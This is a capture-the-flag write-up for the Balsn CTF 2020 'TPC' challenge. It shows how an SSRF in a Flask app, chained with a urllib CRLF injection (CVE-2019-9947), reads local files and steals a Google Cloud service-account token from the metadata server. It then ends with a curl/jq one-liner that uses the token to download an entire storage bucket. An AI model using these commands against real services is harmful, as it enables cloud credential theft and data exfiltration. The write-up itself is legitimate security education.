## TPC

by TnMch



By checking the url givng `http://35.194.175.80:8000/` we found a printed text that mentions the entry point for this challenge



sending `file:///etc/passwd` as a **site** argument gives us the content for  `/etc/passwd`

```
view-source:http://35.194.175.80:8000/query?site=file:///etc/passwd
```

<img src="https://user-images.githubusercontent.com/7364615/99298929-c7d13680-284a-11eb-8d4b-23d495400e72.png" alt="etc_passwd" style="zoom: 67%;" />

So its **SSRF** ( Server-side request forgery ), if we send `file:///proc/self/cmdline` we get the command line which include python file name `main-dc1e2f5f7a4f359bb5ce1317a`.py

```
/usr/local/bin/python/usr/local/bin/gunicorn main-dc1e2f5f7a4f359bb5ce1317a:app--bind0.0.0.0:8000--workers5--worker-tmp-dir/dev/shm--worker-classgevent--access-logfile---error-logfile-
```

 And finally read the source code http://35.194.175.80:8000/query?site=file:///opt/workdir/main-dc1e2f5f7a4f359bb5ce1317a.py`

```
import urllib.request

from flask import Flask, request

app = Flask(__name__)


@app.route("/query")
def query():
    site = request.args.get('site')
    text = urllib.request.urlopen(site).read()
    return text


@app.route("/")
def hello_world():
    return "/query?site=[your website]"


if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=8000)
```



Simple code, if we read more on `urllib` we can find it vulnerable to **CRLF** : https://bugs.python.org/issue35906 (CVE-2019-9947)

And if we check `file:///etc/hosts` we find 

```
169.254.169.254 metadata.google.internal metadata
```

So we can read google cloud metadata using **SSRF** chained with **CRLF** 

```
curl -v 'http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/instance/%20HTTP%2F1.1%0D%0AMetadata-Flavor:%20Google%0D%0Alol:%20'
```

As output we have 

```
attributes/
cpu-platform
description
disks/
guest-attributes/
hostname
id
image
legacy-endpoint-access/
licenses/
machine-type
maintenance-event
name
network-interfaces/
preempted
remaining-cpu-time
scheduling/
service-accounts/
tags
virtual-clock/
zone
```



We just next get access token , find out that we have access to storage **devstorage.read_only**

```
{
  "issued_to": "102193360015934362205",
  "audience": "102193360015934362205",
  "scope": "https://www.googleapis.com/auth/trace.append https://www.googleapis.com/auth/monitoring.write https://www.googleapis.com/auth/service.management.readonly https://www.googleapis.com/auth/servicecontrol https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_only",
  "expires_in": 2844,
  "access_type": "online"
}
```

Reading **access_token**

```
curl -s 'http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%20HTTP%2F1.1%0D%0AMetadata-Flavor:%20Google%0D%0Alol:%20'
```

And to read all `asia.artifacts.balsn-ctf-2020-tpc.appspot.com` bucket data

We have full cmd to just process all this steps :

```
mkdir out && access_token=$(curl -s 'http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%20HTTP%2F1.1%0D%0AMetadata-Flavor:%20Google%0D%0Alol:%20' | jq -r '.access_token') && curl -s 'https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o?access_token='$access_token | jq -r '.items[].name' | while read obj;do curl -s -X GET -H 'Authorization: Bearer '$access_token https://storage.googleapis.com/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/{$obj} --output out/output_$(echo $obj | cut -d ':' -f 2)  ;done && cd out && for i in $(ls); do mkdir files;tar -xvf $i -C files/ ;done && grep -r "BALSN" files/opt
```

And we just got the flag in the `/opt/workdir` directory

```
BALSN{What_permissions_does_the_service_account_need}
```
